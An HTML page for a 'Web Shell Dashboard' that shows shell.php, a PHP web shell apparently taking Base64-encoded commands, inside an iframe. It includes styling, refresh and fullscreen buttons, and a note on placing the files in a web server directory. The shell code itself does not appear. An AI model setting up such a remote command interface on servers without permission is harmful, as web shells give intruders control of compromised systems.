<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: rgba(0,0,0,0.85);
            color: white;
            padding: 15px 25px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            backdrop-filter: blur(10px);
        }
        
        .header h1 {
            font-size: 1.4rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .status {
            background: #2dd4bf;
            color: #0f172a;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: bold;
            font-family: monospace;
        }
        
        .container {
            flex: 1;
            padding: 20px;
            display: flex;
            flex-direction: column;
        }
        
        .iframe-wrapper {
            flex: 1;
            background: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            border: 2px solid #2dd4bf;
            display: flex;
            flex-direction: column;
        }
        
        .iframe-toolbar {
            background: #0f172a;
            padding: 8px 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
        }
        
        .iframe-toolbar span {
            color: #94a3b8;
            font-size: 0.75rem;
            font-family: monospace;
        }
        
        button {
            background: #2dd4bf;
            border: none;
            padding: 5px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.75rem;
            font-weight: bold;
            font-family: monospace;
        }
        
        button:hover {
            background: #5eead4;
        }
        
        iframe {
            width: 100%;
            flex: 1;
            border: none;
            background: #0f172a;
        }
        
        .info-bar {
            background: rgba(0,0,0,0.75);
            color: #cbd5e1;
            padding: 10px 20px;
            font-size: 0.75rem;
            text-align: center;
            margin-top: 10px;
            border-radius: 8px;
            backdrop-filter: blur(5px);
        }
        
        .info-bar code {
            background: #1e293b;
            padding: 2px 6px;
            border-radius: 4px;
            color: #2dd4bf;
        }
        
        @media (max-width: 768px) {
            .header h1 { font-size: 1rem; }
            .status { font-size: 0.65rem; }
            .info-bar { font-size: 0.65rem; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>
            🖥️ Remote Command Interface
            <span class="status">● PHP ACTIVE</span>
        </h1>
        <div style="display: flex; gap: 10px;">
            <button onclick="refreshIframe()">⟳ Refresh Shell</button>
            <button onclick="openFullscreen()">🔲 Fullscreen</button>
        </div>
    </div>
    
    <div class="container">
        <div class="iframe-wrapper">
            <div class="iframe-toolbar">
                <span>📄 shell.php</span>
                <span>🔒 Base64 encoded commands</span>
            </div>
            <iframe id="shellFrame" src="shell.php" title="PHP Web Shell"></iframe>
        </div>
        <div class="info-bar">
            💡 <strong>How it works:</strong> The iframe loads <code>shell.php</code> from the server → PHP executes commands → results displayed inside iframe.<br>
            📁 Make sure both <code>index.html</code> and <code>shell.php</code> are in the same web server directory (e.g., htdocs, public_html).
        </div>
    </div>
    
    <script>
        function refreshIframe() {
            const frame = document.getElementById('shellFrame');
            frame.src = frame.src;
        }
        
        function openFullscreen() {
            const wrapper = document.querySelector('.iframe-wrapper');
            if (wrapper.requestFullscreen) {
                wrapper.requestFullscreen();
            } else if (wrapper.webkitRequestFullscreen) {
                wrapper.webkitRequestFullscreen();
            } else if (wrapper.msRequestFullscreen) {
                wrapper.msRequestFullscreen();
            }
        }
        
        // Optional: reload iframe periodically? Not needed but available
        console.log('Web Shell Dashboard ready - iframe will load shell.php');
    </script>
</body>
</html>
